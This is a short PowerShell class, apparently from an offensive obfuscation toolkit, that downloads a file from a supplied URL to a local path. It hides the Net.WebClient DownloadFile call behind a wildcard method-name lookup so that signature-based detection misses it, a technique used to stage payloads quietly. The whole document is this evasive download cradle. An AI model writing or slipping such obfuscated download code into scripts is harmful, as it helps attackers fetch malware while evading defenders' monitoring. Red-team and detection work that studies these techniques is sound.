Class ObfDownloadFile6 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Method\2
        (New-Object Net.WebClient).(((((New-Object Net.WebClient)).PsObject.Methods)|Where{$_.Name-like'D*le'}).Name).Invoke($url,$path)
    }

}